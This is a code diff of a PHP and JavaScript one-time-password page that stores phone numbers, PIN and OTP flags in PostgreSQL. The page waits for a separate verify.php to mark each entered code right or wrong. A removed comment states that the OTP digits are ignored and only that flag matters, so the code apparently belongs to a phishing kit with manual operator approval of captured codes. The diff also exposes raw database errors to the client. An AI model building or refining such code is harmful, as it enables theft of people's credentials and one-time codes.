@@ -96,7 +96,6 @@ $error = '';
 
 // Process OTP submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
-    // We ignore the actual OTP digits – only the database flag matters
     $otpArray = isset($_POST['otp']) ? $_POST['otp'] : [];
     $enteredOtp = implode('', $otpArray);
     $enteredOtp = preg_replace('/[^0-9]/', '', $enteredOtp);
@@ -106,26 +105,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_SERVER['HTTP_X_REQUESTED_W
         $error = "System error. Please contact administrator.";
         error_log("PostgreSQL connection failed in otp.php");
     } else {
-        // Ensure `users` table exists with all required columns
+        // Ensure `users` table exists with all required columns - MATCHING verify.php
         $createSQL = "
             CREATE TABLE IF NOT EXISTS users (
                 phone VARCHAR(20) PRIMARY KEY,
-                status INTEGER DEFAULT 0,
                 pin INTEGER DEFAULT 0,
                 otp INTEGER DEFAULT 0,
+                approve INTEGER DEFAULT 0,
                 logout INTEGER DEFAULT 0,
-                error_processing INTEGER DEFAULT 0
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         ";
         pg_query($conn, $createSQL);
         
-        // Add error_processing column if it doesn't exist (for existing tables)
-        $alterSQL = "ALTER TABLE users ADD COLUMN IF NOT EXISTS error_processing INTEGER DEFAULT 0";
-        @pg_query($conn, $alterSQL);
+        // Add any missing columns (matching verify.php)
+        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS pin INTEGER DEFAULT 0");
+        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS otp INTEGER DEFAULT 0");
+        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS approve INTEGER DEFAULT 0");
+        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS logout INTEGER DEFAULT 0");
+        pg_query($conn, "ALTER TABLE users ADD COLUMN IF NOT EXISTS created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP");
         
         // Insert phone if not exists
-        $insertSQL = "INSERT INTO users (phone, status, pin, otp, logout) 
-                      VALUES ($1, 0, 0, 0, 0) 
+        $insertSQL = "INSERT INTO users (phone, pin, otp, approve, logout, created_at) 
+                      VALUES ($1, 0, 0, 0, 0, NOW()) 
                       ON CONFLICT (phone) DO NOTHING";
         pg_query_params($conn, $insertSQL, [$phone]);
         
@@ -373,6 +375,7 @@ function checkDatabaseStatus() {
         
         if (data.success) {
             const otpValue = data.otp_value;
+            console.log('Current OTP value from DB:', otpValue); // Debug log
             
             // Only update if value has changed
             if (lastOtpValue !== otpValue) {
@@ -380,24 +383,20 @@ function checkDatabaseStatus() {
                 console.log('OTP value changed to:', otpValue); // Debug log
                 
                 // Check the OTP database value
+                // IMPORTANT: verify.php sets: wrong=1, correct=2
                 if (otpValue === 0) {
                     // Still verifying - keep showing "verifying" message
                     showMessage('🔍 Verifying...', 'status-verifying', false);
                 } else if (otpValue === 1) {
-                    // Wrong OTP detected
+                    // Wrong OTP detected (verify.php set to 1)
                     showMessage('❌ Wrong OTP', 'status-wrong', true);
-                    // Disable inputs
-                    inputs.forEach(input => input.disabled = true);
-                    submitBtn.disabled = true;
                     // Stop monitoring
                     if (monitoringInterval) {
                         clearInterval(monitoringInterval);
                         monitoringInterval = null;
                     }
-                    isProcessing = false;
-                    lastOtpValue = null;
                 } else if (otpValue === 2) {
-                    // OTP verified - redirect
+                    // OTP verified - redirect (verify.php set to 2)
                     showMessage('✅ OTP Verified! Redirecting...', 'status-verifying', false);
                     // Stop monitoring
                     if (monitoringInterval) {
@@ -415,12 +414,9 @@ function checkDatabaseStatus() {
                         }
                     }, 1000);
                 }
-            } else {
-                // Keep showing current message without flashing
-                if (otpValue === 0 && statusDiv.classList.contains('status-verifying')) {
-                    // Message already showing, do nothing
-                }
             }
+        } else {
+            console.error('Status check failed:', data.error);
         }
     })
     .catch(error => {
@@ -438,16 +434,22 @@ function showMessage(message, type, autoHide = false) {
         errorTimeout = setTimeout(() => {
             statusDiv.classList.remove('show');
             // Re-enable inputs for retry
-            inputs.forEach(input => input.disabled = false);
+            inputs.forEach(input => {
+                input.disabled = false;
+                input.value = '';
+            });
             submitBtn.disabled = false;
             submitBtn.textContent = 'Submit';
-            // Clear the OTP inputs for retry
-            inputs.forEach(input => input.value = '');
             inputs[0].focus();
             // Reset processing flag
             isProcessing = false;
             // Clear last value to allow new monitoring
             lastOtpValue = null;
+            // Clear any existing monitoring
+            if (monitoringInterval) {
+                clearInterval(monitoringInterval);
+                monitoringInterval = null;
+            }
         }, 3000);
     }
 }
@@ -588,6 +590,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
         exit;
     }
     
+    // Query the SAME otp column that verify.php updates
     $sql = "SELECT otp, logout FROM users WHERE phone = $1";
     $result = pg_query_params($conn, $sql, [$phone]);
     
@@ -595,13 +598,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
         $otpValue = (int)$row['otp'];
         $logoutStatus = (int)$row['logout'];
         
+        // Debug log to server
+        error_log("Status check for $phone: otp=$otpValue, logout=$logoutStatus");
+        
         echo json_encode([
             'success' => true, 
             'otp_value' => $otpValue,
             'logout_status' => $logoutStatus
         ]);
     } else {
-        echo json_encode(['success' => false, 'error' => 'User not found']);
+        echo json_encode(['success' => false, 'error' => 'User not found: ' . pg_last_error($conn)]);
     }
     exit;
 }
